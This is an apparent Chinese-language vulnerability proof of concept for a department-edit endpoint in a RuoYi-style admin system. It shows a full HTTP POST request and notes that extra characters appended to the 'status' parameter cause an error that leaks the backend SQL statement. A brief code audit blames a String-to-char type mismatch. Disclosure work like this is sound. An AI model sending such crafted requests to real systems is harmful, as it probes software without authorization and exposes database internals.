# POC
# 漏洞验证
POST /system/dept/edit HTTP/1.1
Host: 127.0.0.1
Content-Length: 209
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
sec-ch-ua-platform: "macOS"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/dept/edit/103
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=a484ff97-3a44-4dc2-bc54-e0332d37da5b
Connection: close

deptId=103&parentId=101&parentName=%E6%B7%B1%E5%9C%B3%E6%80%BB%E5%85%AC%E5%8F%B8&deptName=%E7%A0%94%E5%8F%91%E9%83%A8%E9%97%A8&orderNum=1&leader=%E8%8B%A5%E4%BE%9D&phone=15888888888&email=ry%40qq.com&status=1&
在 status 参数后边拼接任意字符, 会出现报错, 错误信息包含漏洞 SQL 语句
![image](https://github.com/Fr1ezy/POC/assets/54392222/0595d7dd-a2a0-4382-a7d7-5527abac72d1)

# 代码审计
status 参数后端定义为 String 类型, 但数据库定义为 char 类型
char 类型用于存储固定长度的字符串, 并且当存储的字符串长度小于定义的长度时, 会在字符串末尾填充空格, 所以只要修改 status 参数超过 char 默认长度, 造成报错, 从而泄露数据库查询所用 SQL 语句
![image](https://github.com/Fr1ezy/POC/assets/54392222/9a4d9797-817d-4d43-8e53-9d21759a9e0a)
![image](https://github.com/Fr1ezy/POC/assets/54392222/195c9717-b746-4b26-adab-94d8981d4a3d)

